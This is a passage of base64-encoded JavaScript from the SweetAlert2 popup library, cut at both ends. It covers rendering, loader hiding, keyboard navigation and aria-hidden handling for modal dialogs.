N1bWVudC5jcmVhdGVFbGVtZW50KCdsaScpO1xuICAgIGFkZENsYXNzKHN0ZXBFbCwgc3dhbENsYXNzZXNbJ3Byb2dyZXNzLXN0ZXAnXSk7XG4gICAgc2V0SW5uZXJIdG1sKHN0ZXBFbCwgc3RlcCk7XG4gICAgcmV0dXJuIHN0ZXBFbDtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqIEByZXR1cm5zIHtIVE1MTElFbGVtZW50fVxuICAgKi9cbiAgY29uc3QgY3JlYXRlTGluZUVsZW1lbnQgPSBwYXJhbXMgPT4ge1xuICAgIGNvbnN0IGxpbmVFbCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xpJyk7XG4gICAgYWRkQ2xhc3MobGluZUVsLCBzd2FsQ2xhc3Nlc1sncHJvZ3Jlc3Mtc3RlcC1saW5lJ10pO1xuICAgIGlmIChwYXJhbXMucHJvZ3Jlc3NTdGVwc0Rpc3RhbmNlKSB7XG4gICAgICBhcHBseU51bWVyaWNhbFN0eWxlKGxpbmVFbCwgJ3dpZHRoJywgcGFyYW1zLnByb2dyZXNzU3RlcHNEaXN0YW5jZSk7XG4gICAgfVxuICAgIHJldHVybiBsaW5lRWw7XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydDJ9IGluc3RhbmNlXG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IHBhcmFtc1xuICAgKi9cbiAgY29uc3QgcmVuZGVyVGl0bGUgPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIGNvbnN0IHRpdGxlID0gZ2V0VGl0bGUoKTtcbiAgICB0b2dnbGUodGl0bGUsIHBhcmFtcy50aXRsZSB8fCBwYXJhbXMudGl0bGVUZXh0LCAnYmxvY2snKTtcbiAgICBpZiAocGFyYW1zLnRpdGxlKSB7XG4gICAgICBwYXJzZUh0bWxUb0NvbnRhaW5lcihwYXJhbXMudGl0bGUsIHRpdGxlKTtcbiAgICB9XG4gICAgaWYgKHBhcmFtcy50aXRsZVRleHQpIHtcbiAgICAgIHRpdGxlLmlubmVyVGV4dCA9IHBhcmFtcy50aXRsZVRleHQ7XG4gICAgfVxuXG4gICAgLy8gQ3VzdG9tIGNsYXNzXG4gICAgYXBwbHlDdXN0b21DbGFzcyh0aXRsZSwgcGFyYW1zLCAndGl0bGUnKTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0T3B0aW9uc30gcGFyYW1zXG4gICAqL1xuICBjb25zdCByZW5kZXIgPSAoaW5zdGFuY2UsIHBhcmFtcykgPT4ge1xuICAgIHJlbmRlclBvcHVwKGluc3RhbmNlLCBwYXJhbXMpO1xuICAgIHJlbmRlckNvbnRhaW5lcihpbnN0YW5jZSwgcGFyYW1zKTtcbiAgICByZW5kZXJQcm9ncmVzc1N0ZXBzKGluc3RhbmNlLCBwYXJhbXMpO1xuICAgIHJlbmRlckljb24oaW5zdGFuY2UsIHBhcmFtcyk7XG4gICAgcmVuZGVySW1hZ2UoaW5zdGFuY2UsIHBhcmFtcyk7XG4gICAgcmVuZGVyVGl0bGUoaW5zdGFuY2UsIHBhcmFtcyk7XG4gICAgcmVuZGVyQ2xvc2VCdXR0b24oaW5zdGFuY2UsIHBhcmFtcyk7XG4gICAgcmVuZGVyQ29udGVudChpbnN0YW5jZSwgcGFyYW1zKTtcbiAgICByZW5kZXJBY3Rpb25zKGluc3RhbmNlLCBwYXJhbXMpO1xuICAgIHJlbmRlckZvb3RlcihpbnN0YW5jZSwgcGFyYW1zKTtcbiAgICBpZiAodHlwZW9mIHBhcmFtcy5kaWRSZW5kZXIgPT09ICdmdW5jdGlvbicpIHtcbiAgICAgIHBhcmFtcy5kaWRSZW5kZXIoZ2V0UG9wdXAoKSk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBIaWRlcyBsb2FkZXIgYW5kIHNob3dzIGJhY2sgdGhlIGJ1dHRvbiB3aGljaCB3YXMgaGlkZGVuIGJ5IC5zaG93TG9hZGluZygpXG4gICAqL1xuICBmdW5jdGlvbiBoaWRlTG9hZGluZygpIHtcbiAgICAvLyBkbyBub3RoaW5nIGlmIHBvcHVwIGlzIGNsb3NlZFxuICAgIGNvbnN0IGlubmVyUGFyYW1zID0gcHJpdmF0ZVByb3BzLmlubmVyUGFyYW1zLmdldCh0aGlzKTtcbiAgICBpZiAoIWlubmVyUGFyYW1zKSB7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIGNvbnN0IGRvbUNhY2hlID0gcHJpdmF0ZVByb3BzLmRvbUNhY2hlLmdldCh0aGlzKTtcbiAgICBoaWRlKGRvbUNhY2hlLmxvYWRlcik7XG4gICAgaWYgKGlzVG9hc3QoKSkge1xuICAgICAgaWYgKGlubmVyUGFyYW1zLmljb24pIHtcbiAgICAgICAgc2hvdyhnZXRJY29uKCkpO1xuICAgICAgfVxuICAgIH0gZWxzZSB7XG4gICAgICBzaG93UmVsYXRlZEJ1dHRvbihkb21DYWNoZSk7XG4gICAgfVxuICAgIHJlbW92ZUNsYXNzKFtkb21DYWNoZS5wb3B1cCwgZG9tQ2FjaGUuYWN0aW9uc10sIHN3YWxDbGFzc2VzLmxvYWRpbmcpO1xuICAgIGRvbUNhY2hlLnBvcHVwLnJlbW92ZUF0dHJpYnV0ZSgnYXJpYS1idXN5Jyk7XG4gICAgZG9tQ2FjaGUucG9wdXAucmVtb3ZlQXR0cmlidXRlKCdkYXRhLWxvYWRpbmcnKTtcbiAgICBkb21DYWNoZS5jb25maXJtQnV0dG9uLmRpc2FibGVkID0gZmFsc2U7XG4gICAgZG9tQ2FjaGUuZGVueUJ1dHRvbi5kaXNhYmxlZCA9IGZhbHNlO1xuICAgIGRvbUNhY2hlLmNhbmNlbEJ1dHRvbi5kaXNhYmxlZCA9IGZhbHNlO1xuICB9XG4gIGNvbnN0IHNob3dSZWxhdGVkQnV0dG9uID0gZG9tQ2FjaGUgPT4ge1xuICAgIGNvbnN0IGJ1dHRvblRvUmVwbGFjZSA9IGRvbUNhY2hlLnBvcHVwLmdldEVsZW1lbnRzQnlDbGFzc05hbWUoZG9tQ2FjaGUubG9hZGVyLmdldEF0dHJpYnV0ZSgnZGF0YS1idXR0b24tdG8tcmVwbGFjZScpKTtcbiAgICBpZiAoYnV0dG9uVG9SZXBsYWNlLmxlbmd0aCkge1xuICAgICAgc2hvdyhidXR0b25Ub1JlcGxhY2VbMF0sICdpbmxpbmUtYmxvY2snKTtcbiAgICB9IGVsc2UgaWYgKGFsbEJ1dHRvbnNBcmVIaWRkZW4oKSkge1xuICAgICAgaGlkZShkb21DYWNoZS5hY3Rpb25zKTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEdldHMgdGhlIGlucHV0IERPTSBub2RlLCB0aGlzIG1ldGhvZCB3b3JrcyB3aXRoIGlucHV0IHBhcmFtZXRlci5cbiAgICpcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHJldHVybnMge0hUTUxFbGVtZW50IHwgbnVsbH1cbiAgICovXG4gIGZ1bmN0aW9uIGdldElucHV0KGluc3RhbmNlKSB7XG4gICAgY29uc3QgaW5uZXJQYXJhbXMgPSBwcml2YXRlUHJvcHMuaW5uZXJQYXJhbXMuZ2V0KGluc3RhbmNlIHx8IHRoaXMpO1xuICAgIGNvbnN0IGRvbUNhY2hlID0gcHJpdmF0ZVByb3BzLmRvbUNhY2hlLmdldChpbnN0YW5jZSB8fCB0aGlzKTtcbiAgICBpZiAoIWRvbUNhY2hlKSB7XG4gICAgICByZXR1cm4gbnVsbDtcbiAgICB9XG4gICAgcmV0dXJuIGdldElucHV0JDEoZG9tQ2FjaGUucG9wdXAsIGlubmVyUGFyYW1zLmlucHV0KTtcbiAgfVxuXG4gIC8qXG4gICAqIEdsb2JhbCBmdW5jdGlvbiB0byBkZXRlcm1pbmUgaWYgU3dlZXRBbGVydDIgcG9wdXAgaXMgc2hvd25cbiAgICovXG4gIGNvbnN0IGlzVmlzaWJsZSA9ICgpID0+IHtcbiAgICByZXR1cm4gaXNWaXNpYmxlJDEoZ2V0UG9wdXAoKSk7XG4gIH07XG5cbiAgLypcbiAgICogR2xvYmFsIGZ1bmN0aW9uIHRvIGNsaWNrICdDb25maXJtJyBidXR0b25cbiAgICovXG4gIGNvbnN0IGNsaWNrQ29uZmlybSA9ICgpID0+IGdldENvbmZpcm1CdXR0b24oKSAmJiBnZXRDb25maXJtQnV0dG9uKCkuY2xpY2soKTtcblxuICAvKlxuICAgKiBHbG9iYWwgZnVuY3Rpb24gdG8gY2xpY2sgJ0RlbnknIGJ1dHRvblxuICAgKi9cbiAgY29uc3QgY2xpY2tEZW55ID0gKCkgPT4gZ2V0RGVueUJ1dHRvbigpICYmIGdldERlbnlCdXR0b24oKS5jbGljaygpO1xuXG4gIC8qXG4gICAqIEdsb2JhbCBmdW5jdGlvbiB0byBjbGljayAnQ2FuY2VsJyBidXR0b25cbiAgICovXG4gIGNvbnN0IGNsaWNrQ2FuY2VsID0gKCkgPT4gZ2V0Q2FuY2VsQnV0dG9uKCkgJiYgZ2V0Q2FuY2VsQnV0dG9uKCkuY2xpY2soKTtcblxuICBjb25zdCBEaXNtaXNzUmVhc29uID0gT2JqZWN0LmZyZWV6ZSh7XG4gICAgY2FuY2VsOiAnY2FuY2VsJyxcbiAgICBiYWNrZHJvcDogJ2JhY2tkcm9wJyxcbiAgICBjbG9zZTogJ2Nsb3NlJyxcbiAgICBlc2M6ICdlc2MnLFxuICAgIHRpbWVyOiAndGltZXInXG4gIH0pO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0dsb2JhbFN0YXRlfSBnbG9iYWxTdGF0ZVxuICAgKi9cbiAgY29uc3QgcmVtb3ZlS2V5ZG93bkhhbmRsZXIgPSBnbG9iYWxTdGF0ZSA9PiB7XG4gICAgaWYgKGdsb2JhbFN0YXRlLmtleWRvd25UYXJnZXQgJiYgZ2xvYmFsU3RhdGUua2V5ZG93bkhhbmRsZXJBZGRlZCkge1xuICAgICAgZ2xvYmFsU3RhdGUua2V5ZG93blRhcmdldC5yZW1vdmVFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZ2xvYmFsU3RhdGUua2V5ZG93bkhhbmRsZXIsIHtcbiAgICAgICAgY2FwdHVyZTogZ2xvYmFsU3RhdGUua2V5ZG93bkxpc3RlbmVyQ2FwdHVyZVxuICAgICAgfSk7XG4gICAgICBnbG9iYWxTdGF0ZS5rZXlkb3duSGFuZGxlckFkZGVkID0gZmFsc2U7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge0dsb2JhbFN0YXRlfSBnbG9iYWxTdGF0ZVxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBpbm5lclBhcmFtc1xuICAgKiBAcGFyYW0geyp9IGRpc21pc3NXaXRoXG4gICAqL1xuICBjb25zdCBhZGRLZXlkb3duSGFuZGxlciA9IChpbnN0YW5jZSwgZ2xvYmFsU3RhdGUsIGlubmVyUGFyYW1zLCBkaXNtaXNzV2l0aCkgPT4ge1xuICAgIHJlbW92ZUtleWRvd25IYW5kbGVyKGdsb2JhbFN0YXRlKTtcbiAgICBpZiAoIWlubmVyUGFyYW1zLnRvYXN0KSB7XG4gICAgICBnbG9iYWxTdGF0ZS5rZXlkb3duSGFuZGxlciA9IGUgPT4ga2V5ZG93bkhhbmRsZXIoaW5zdGFuY2UsIGUsIGRpc21pc3NXaXRoKTtcbiAgICAgIGdsb2JhbFN0YXRlLmtleWRvd25UYXJnZXQgPSBpbm5lclBhcmFtcy5rZXlkb3duTGlzdGVuZXJDYXB0dXJlID8gd2luZG93IDogZ2V0UG9wdXAoKTtcbiAgICAgIGdsb2JhbFN0YXRlLmtleWRvd25MaXN0ZW5lckNhcHR1cmUgPSBpbm5lclBhcmFtcy5rZXlkb3duTGlzdGVuZXJDYXB0dXJlO1xuICAgICAgZ2xvYmFsU3RhdGUua2V5ZG93blRhcmdldC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZ2xvYmFsU3RhdGUua2V5ZG93bkhhbmRsZXIsIHtcbiAgICAgICAgY2FwdHVyZTogZ2xvYmFsU3RhdGUua2V5ZG93bkxpc3RlbmVyQ2FwdHVyZVxuICAgICAgfSk7XG4gICAgICBnbG9iYWxTdGF0ZS5rZXlkb3duSGFuZGxlckFkZGVkID0gdHJ1ZTtcbiAgICB9XG4gIH07XG5cbiAgLyoqXG4gICAqIEBwYXJhbSB7bnVtYmVyfSBpbmRleFxuICAgKiBAcGFyYW0ge251bWJlcn0gaW5jcmVtZW50XG4gICAqL1xuICBjb25zdCBzZXRGb2N1cyA9IChpbmRleCwgaW5jcmVtZW50KSA9PiB7XG4gICAgY29uc3QgZm9jdXNhYmxlRWxlbWVudHMgPSBnZXRGb2N1c2FibGVFbGVtZW50cygpO1xuICAgIC8vIHNlYXJjaCBmb3IgdmlzaWJsZSBlbGVtZW50cyBhbmQgc2VsZWN0IHRoZSBuZXh0IHBvc3NpYmxlIG1hdGNoXG4gICAgaWYgKGZvY3VzYWJsZUVsZW1lbnRzLmxlbmd0aCkge1xuICAgICAgaW5kZXggPSBpbmRleCArIGluY3JlbWVudDtcblxuICAgICAgLy8gcm9sbG92ZXIgdG8gZmlyc3QgaXRlbVxuICAgICAgaWYgKGluZGV4ID09PSBmb2N1c2FibGVFbGVtZW50cy5sZW5ndGgpIHtcbiAgICAgICAgaW5kZXggPSAwO1xuXG4gICAgICAgIC8vIGdvIHRvIGxhc3QgaXRlbVxuICAgICAgfSBlbHNlIGlmIChpbmRleCA9PT0gLTEpIHtcbiAgICAgICAgaW5kZXggPSBmb2N1c2FibGVFbGVtZW50cy5sZW5ndGggLSAxO1xuICAgICAgfVxuICAgICAgZm9jdXNhYmxlRWxlbWVudHNbaW5kZXhdLmZvY3VzKCk7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIC8vIG5vIHZpc2libGUgZm9jdXNhYmxlIGVsZW1lbnRzLCBmb2N1cyB0aGUgcG9wdXBcbiAgICBnZXRQb3B1cCgpLmZvY3VzKCk7XG4gIH07XG4gIGNvbnN0IGFycm93S2V5c05leHRCdXR0b24gPSBbJ0Fycm93UmlnaHQnLCAnQXJyb3dEb3duJ107XG4gIGNvbnN0IGFycm93S2V5c1ByZXZpb3VzQnV0dG9uID0gWydBcnJvd0xlZnQnLCAnQXJyb3dVcCddO1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnQyfSBpbnN0YW5jZVxuICAgKiBAcGFyYW0ge0tleWJvYXJkRXZlbnR9IGV2ZW50XG4gICAqIEBwYXJhbSB7RnVuY3Rpb259IGRpc21pc3NXaXRoXG4gICAqL1xuICBjb25zdCBrZXlkb3duSGFuZGxlciA9IChpbnN0YW5jZSwgZXZlbnQsIGRpc21pc3NXaXRoKSA9PiB7XG4gICAgY29uc3QgaW5uZXJQYXJhbXMgPSBwcml2YXRlUHJvcHMuaW5uZXJQYXJhbXMuZ2V0KGluc3RhbmNlKTtcbiAgICBpZiAoIWlubmVyUGFyYW1zKSB7XG4gICAgICByZXR1cm47IC8vIFRoaXMgaW5zdGFuY2UgaGFzIGFscmVhZHkgYmVlbiBkZXN0cm95ZWRcbiAgICB9XG5cbiAgICAvLyBJZ25vcmUga2V5ZG93biBkdXJpbmcgSU1FIGNvbXBvc2l0aW9uXG4gICAgLy8gaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvQVBJL0RvY3VtZW50L2tleWRvd25fZXZlbnQjaWdub3Jpbmdfa2V5ZG93bl9kdXJpbmdfaW1lX2NvbXBvc2l0aW9uXG4gICAgLy8gaHR0cHM6Ly9naXRodWIuY29tL3N3ZWV0YWxlcnQyL3N3ZWV0YWxlcnQyL2lzc3Vlcy83MjBcbiAgICAvLyBodHRwczovL2dpdGh1Yi5jb20vc3dlZXRhbGVydDIvc3dlZXRhbGVydDIvaXNzdWVzLzI0MDZcbiAgICBpZiAoZXZlbnQuaXNDb21wb3NpbmcgfHwgZXZlbnQua2V5Q29kZSA9PT0gMjI5KSB7XG4gICAgICByZXR1cm47XG4gICAgfVxuICAgIGlmIChpbm5lclBhcmFtcy5zdG9wS2V5ZG93blByb3BhZ2F0aW9uKSB7XG4gICAgICBldmVudC5zdG9wUHJvcGFnYXRpb24oKTtcbiAgICB9XG5cbiAgICAvLyBFTlRFUlxuICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHtcbiAgICAgIGhhbmRsZUVudGVyKGluc3RhbmNlLCBldmVudCwgaW5uZXJQYXJhbXMpO1xuICAgIH1cblxuICAgIC8vIFRBQlxuICAgIGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gJ1RhYicpIHtcbiAgICAgIGhhbmRsZVRhYihldmVudCk7XG4gICAgfVxuXG4gICAgLy8gQVJST1dTIC0gc3dpdGNoIGZvY3VzIGJldHdlZW4gYnV0dG9uc1xuICAgIGVsc2UgaWYgKFsuLi5hcnJvd0tleXNOZXh0QnV0dG9uLCAuLi5hcnJvd0tleXNQcmV2aW91c0J1dHRvbl0uaW5jbHVkZXMoZXZlbnQua2V5KSkge1xuICAgICAgaGFuZGxlQXJyb3dzKGV2ZW50LmtleSk7XG4gICAgfVxuXG4gICAgLy8gRVNDXG4gICAgZWxzZSBpZiAoZXZlbnQua2V5ID09PSAnRXNjYXBlJykge1xuICAgICAgaGFuZGxlRXNjKGV2ZW50LCBpbm5lclBhcmFtcywgZGlzbWlzc1dpdGgpO1xuICAgIH1cbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtTd2VldEFsZXJ0Mn0gaW5zdGFuY2VcbiAgICogQHBhcmFtIHtLZXlib2FyZEV2ZW50fSBldmVudFxuICAgKiBAcGFyYW0ge1N3ZWV0QWxlcnRPcHRpb25zfSBpbm5lclBhcmFtc1xuICAgKi9cbiAgY29uc3QgaGFuZGxlRW50ZXIgPSAoaW5zdGFuY2UsIGV2ZW50LCBpbm5lclBhcmFtcykgPT4ge1xuICAgIC8vIGh0dHBzOi8vZ2l0aHViLmNvbS9zd2VldGFsZXJ0Mi9zd2VldGFsZXJ0Mi9pc3N1ZXMvMjM4NlxuICAgIGlmICghY2FsbElmRnVuY3Rpb24oaW5uZXJQYXJhbXMuYWxsb3dFbnRlcktleSkpIHtcbiAgICAgIHJldHVybjtcbiAgICB9XG4gICAgaWYgKGV2ZW50LnRhcmdldCAmJiBpbnN0YW5jZS5nZXRJbnB1dCgpICYmIGV2ZW50LnRhcmdldCBpbnN0YW5jZW9mIEhUTUxFbGVtZW50ICYmIGV2ZW50LnRhcmdldC5vdXRlckhUTUwgPT09IGluc3RhbmNlLmdldElucHV0KCkub3V0ZXJIVE1MKSB7XG4gICAgICBpZiAoWyd0ZXh0YXJlYScsICdmaWxlJ10uaW5jbHVkZXMoaW5uZXJQYXJhbXMuaW5wdXQpKSB7XG4gICAgICAgIHJldHVybjsgLy8gZG8gbm90IHN1Ym1pdFxuICAgICAgfVxuXG4gICAgICBjbGlja0NvbmZpcm0oKTtcbiAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0tleWJvYXJkRXZlbnR9IGV2ZW50XG4gICAqL1xuICBjb25zdCBoYW5kbGVUYWIgPSBldmVudCA9PiB7XG4gICAgY29uc3QgdGFyZ2V0RWxlbWVudCA9IGV2ZW50LnRhcmdldDtcbiAgICBjb25zdCBmb2N1c2FibGVFbGVtZW50cyA9IGdldEZvY3VzYWJsZUVsZW1lbnRzKCk7XG4gICAgbGV0IGJ0bkluZGV4ID0gLTE7XG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBmb2N1c2FibGVFbGVtZW50cy5sZW5ndGg7IGkrKykge1xuICAgICAgaWYgKHRhcmdldEVsZW1lbnQgPT09IGZvY3VzYWJsZUVsZW1lbnRzW2ldKSB7XG4gICAgICAgIGJ0bkluZGV4ID0gaTtcbiAgICAgICAgYnJlYWs7XG4gICAgICB9XG4gICAgfVxuXG4gICAgLy8gQ3ljbGUgdG8gdGhlIG5leHQgYnV0dG9uXG4gICAgaWYgKCFldmVudC5zaGlmdEtleSkge1xuICAgICAgc2V0Rm9jdXMoYnRuSW5kZXgsIDEpO1xuICAgIH1cblxuICAgIC8vIEN5Y2xlIHRvIHRoZSBwcmV2IGJ1dHRvblxuICAgIGVsc2Uge1xuICAgICAgc2V0Rm9jdXMoYnRuSW5kZXgsIC0xKTtcbiAgICB9XG4gICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7XG4gICAgZXZlbnQucHJldmVudERlZmF1bHQoKTtcbiAgfTtcblxuICAvKipcbiAgICogQHBhcmFtIHtzdHJpbmd9IGtleVxuICAgKi9cbiAgY29uc3QgaGFuZGxlQXJyb3dzID0ga2V5ID0+IHtcbiAgICBjb25zdCBjb25maXJtQnV0dG9uID0gZ2V0Q29uZmlybUJ1dHRvbigpO1xuICAgIGNvbnN0IGRlbnlCdXR0b24gPSBnZXREZW55QnV0dG9uKCk7XG4gICAgY29uc3QgY2FuY2VsQnV0dG9uID0gZ2V0Q2FuY2VsQnV0dG9uKCk7XG4gICAgLyoqIEB0eXBlIEhUTUxFbGVtZW50W10gKi9cbiAgICBjb25zdCBidXR0b25zID0gW2NvbmZpcm1CdXR0b24sIGRlbnlCdXR0b24sIGNhbmNlbEJ1dHRvbl07XG4gICAgaWYgKGRvY3VtZW50LmFjdGl2ZUVsZW1lbnQgaW5zdGFuY2VvZiBIVE1MRWxlbWVudCAmJiAhYnV0dG9ucy5pbmNsdWRlcyhkb2N1bWVudC5hY3RpdmVFbGVtZW50KSkge1xuICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBjb25zdCBzaWJsaW5nID0gYXJyb3dLZXlzTmV4dEJ1dHRvbi5pbmNsdWRlcyhrZXkpID8gJ25leHRFbGVtZW50U2libGluZycgOiAncHJldmlvdXNFbGVtZW50U2libGluZyc7XG4gICAgbGV0IGJ1dHRvblRvRm9jdXMgPSBkb2N1bWVudC5hY3RpdmVFbGVtZW50O1xuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZ2V0QWN0aW9ucygpLmNoaWxkcmVuLmxlbmd0aDsgaSsrKSB7XG4gICAgICBidXR0b25Ub0ZvY3VzID0gYnV0dG9uVG9Gb2N1c1tzaWJsaW5nXTtcbiAgICAgIGlmICghYnV0dG9uVG9Gb2N1cykge1xuICAgICAgICByZXR1cm47XG4gICAgICB9XG4gICAgICBpZiAoYnV0dG9uVG9Gb2N1cyBpbnN0YW5jZW9mIEhUTUxCdXR0b25FbGVtZW50ICYmIGlzVmlzaWJsZSQxKGJ1dHRvblRvRm9jdXMpKSB7XG4gICAgICAgIGJyZWFrO1xuICAgICAgfVxuICAgIH1cbiAgICBpZiAoYnV0dG9uVG9Gb2N1cyBpbnN0YW5jZW9mIEhUTUxCdXR0b25FbGVtZW50KSB7XG4gICAgICBidXR0b25Ub0ZvY3VzLmZvY3VzKCk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBAcGFyYW0ge0tleWJvYXJkRXZlbnR9IGV2ZW50XG4gICAqIEBwYXJhbSB7U3dlZXRBbGVydE9wdGlvbnN9IGlubmVyUGFyYW1zXG4gICAqIEBwYXJhbSB7RnVuY3Rpb259IGRpc21pc3NXaXRoXG4gICAqL1xuICBjb25zdCBoYW5kbGVFc2MgPSAoZXZlbnQsIGlubmVyUGFyYW1zLCBkaXNtaXNzV2l0aCkgPT4ge1xuICAgIGlmIChjYWxsSWZGdW5jdGlvbihpbm5lclBhcmFtcy5hbGxvd0VzY2FwZUtleSkpIHtcbiAgICAgIGV2ZW50LnByZXZlbnREZWZhdWx0KCk7XG4gICAgICBkaXNtaXNzV2l0aChEaXNtaXNzUmVhc29uLmVzYyk7XG4gICAgfVxuICB9O1xuXG4gIC8qKlxuICAgKiBUaGlzIG1vZHVsZSBjb250YWlucyBgV2Vha01hcGBzIGZvciBlYWNoIGVmZmVjdGl2ZWx5LVwicHJpdmF0ZSAgcHJvcGVydHlcIiB0aGF0IGEgYFN3YWxgIGhhcy5cbiAgICogRm9yIGV4YW1wbGUsIHRvIHNldCB0aGUgcHJpdmF0ZSBwcm9wZXJ0eSBcImZvb1wiIG9mIGB0aGlzYCB0byBcImJhclwiLCB5b3UgY2FuIGBwcml2YXRlUHJvcHMuZm9vLnNldCh0aGlzLCAnYmFyJylgXG4gICAqIFRoaXMgaXMgdGhlIGFwcHJvYWNoIHRoYXQgQmFiZWwgd2lsbCBwcm9iYWJseSB0YWtlIHRvIGltcGxlbWVudCBwcml2YXRlIG1ldGhvZHMvZmllbGRzXG4gICAqICAgaHR0cHM6Ly9naXRodWIuY29tL3RjMzkvcHJvcG9zYWwtcHJpdmF0ZS1tZXRob2RzXG4gICAqICAgaHR0cHM6Ly9naXRodWIuY29tL2JhYmVsL2JhYmVsL3B1bGwvNzU1NVxuICAgKiBPbmNlIHdlIGhhdmUgdGhlIGNoYW5nZXMgZnJvbSB0aGF0IFBSIGluIEJhYmVsLCBhbmQgb3VyIGNvcmUgY2xhc3MgZml0cyByZWFzb25hYmxlIGluICpvbmUgbW9kdWxlKlxuICAgKiAgIHRoZW4gd2UgY2FuIHVzZSB0aGF0IGxhbmd1YWdlIGZlYXR1cmUuXG4gICAqL1xuXG4gIHZhciBwcml2YXRlTWV0aG9kcyA9IHtcbiAgICBzd2FsUHJvbWlzZVJlc29sdmU6IG5ldyBXZWFrTWFwKCksXG4gICAgc3dhbFByb21pc2VSZWplY3Q6IG5ldyBXZWFrTWFwKClcbiAgfTtcblxuICAvLyBGcm9tIGh0dHBzOi8vZGV2ZWxvcGVyLnBhY2llbGxvZ3JvdXAuY29tL2Jsb2cvMjAxOC8wNi90aGUtY3VycmVudC1zdGF0ZS1vZi1tb2RhbC1kaWFsb2ctYWNjZXNzaWJpbGl0eS9cbiAgLy8gQWRkaW5nIGFyaWEtaGlkZGVuPVwidHJ1ZVwiIHRvIGVsZW1lbnRzIG91dHNpZGUgb2YgdGhlIGFjdGl2ZSBtb2RhbCBkaWFsb2cgZW5zdXJlcyB0aGF0XG4gIC8vIGVsZW1lbnRzIG5vdCB3aXRoaW4gdGhlIGFjdGl2ZSBtb2RhbCBkaWFsb2cgd2lsbCBub3QgYmUgc3VyZmFjZWQgaWYgYSB1c2VyIG9wZW5zIGEgc2NyZWVuXG4gIC8vIHJlYWRlclx1MjAxOXMgbGlzdCBvZiBlbGVtZW50cyAoaGVhZGluZ3MsIGZvcm0gY29udHJvbHMsIGxhbmRtYXJrcywgZXRjLikgaW4gdGhlIGRvY3VtZW50LlxuXG4gIGNvbnN0IHNldEFyaWFIaWRkZW4gPSAoKSA9PiB7XG4gICAgY29uc3QgYm9keUNoaWxkcmVuID0gQXJyYXkuZnJvbShkb2N1bWVudC5ib2R5LmNoaWxkcmVuKTtcbiAgICBib2R5Q2hpbGRyZW4uZm9yRWFjaChlbCA9PiB7XG4gICAgICBpZiAoZWwgPT09IGdldENvbnRhaW5lcigpIHx8IGVsLmNvbnRhaW5zKGdldENvbnRhaW5lcigpKSkge1xuICAgICAgICByZXR1cm47XG4gICAgICB9XG4gICAgICBpZiAoZWwuaGFzQXR0cmlidXRlKCdhcmlhLWhpZGRlbicpKSB7XG4gICAgICAgIGVsLnNldEF0dHJpYnV0ZSgnZGF0YS1wcmV2aW91cy1hcmlhLWhpZGRlbicsIGVsLmdldEF0dHJpYnV0ZSgnYXJpYS1oaWRkZW4nKSk7XG4gICAgICB9XG4gICAgICBlbC5zZXRBdHRyaWJ1dGUoJ2FyaWEtaGlkZGVuJywgJ3RydWUnKTtcbiAgICB9KTtcbiAgfTtcbiAgY29uc3QgdW5zZXRBcmlhSGlkZGVuID0gKCkgPT4ge1xuICAgIGNvbnN0IGJvZHlDaGlsZHJlbiA9IEFycmF5LmZyb20oZG9jdW1lbnQuYm9keS5jaGlsZHJlbik7XG4gICAgYm9keUNoaWxkcmVuLmZvckVhY2goZWwgPT4ge1xuICAgICAgaWYgKGVsLmhhc0F0dHJpYnV0ZSgnZGF0YS1wcmV2aW91cy1hcmlhLWhpZGRlbicpKSB7XG4gICAgICAgIGVsLnNldEF0dHJpYnV0ZSgnYXJpYS1oaWRkZW4nLCBlbC5nZXRBdHRyaWJ1dGUoJ2RhdGEtcHJldmlvdXMtYXJpYS1oaWRkZW4nKSk7XG4gICAgICAgIGVsLnJlbW92ZUF0dHJpYnV0ZSgnZGF0YS1wcmV2aW91cy1hcmlhLWhpZGRlbicpO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgZWwucmVtb3ZlQXR0cmlidXRlKCdhcmlhLWhpZGRlbicpO1xuICAgICAgfVxuICAgIH0pO1xuICB9O1xuXG4gIC8qIGlzdGFuYnVsIGlnbm9yZSBmaWxlICovXG5cbiAgLy8gRml4IGlPUyBzY3JvbGxpbmcgaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3EvMzk2MjYzMDJcblxuICBjb25zdCBpT1NmaXggPSAoKSA9PiB7XG4gICAgY29uc3QgaU9TID1cbiAgICAvLyBAdHMtaWdub3JlXG4gICAgL2lQYWR8aVBob25l